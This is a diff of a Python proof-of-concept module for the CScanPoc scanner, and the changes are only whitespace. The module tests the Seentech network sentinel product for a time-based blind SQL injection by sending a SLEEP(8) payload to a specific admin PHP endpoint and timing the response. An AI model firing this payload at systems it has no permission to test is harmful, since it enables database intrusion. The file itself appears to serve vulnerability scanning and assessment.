@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Seentech_0004' # 平台漏洞编号，留空
+    vuln_id = 'Seentech_0004'  # 平台漏洞编号，留空
     name = '中科新业网络哨兵 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-07-17'  # 漏洞公布时间
     desc = '''
         中科新业网络哨兵 /ucenter/admin/addswitchmanage.php 参数过滤不严谨，导致SQL注入漏洞。
@@ -32,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer: http://www.wooyun.org/bugs/wooyun-2010-0126977
+
+            # refer: http://www.wooyun.org/bugs/wooyun-2010-0126977
             hh = hackhttp.hackhttp()
             url = self.target + "/ucenter/admin/addswitchmanage.php?act=E&id=1"
             payload1 = "+AND+(SELECT+*+FROM+(SELECT(SLEEP(8)))ToKi)"
@@ -41,7 +42,7 @@ class Poc(ABPoc):
             code1, _, _, _, _ = hh.http(url)
             true_time = time.time() - t1
             t2 = time.time()
-            code2,_,_,_,_ = hh.http(url + payload1)
+            code2, _, _, _, _ = hh.http(url + payload1)
             false_time = time.time() - t2
             if code1 == 200 and code2 == 200 and false_time-true_time > 7:
                 #security_hole(url + payload1)
@@ -53,6 +54,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
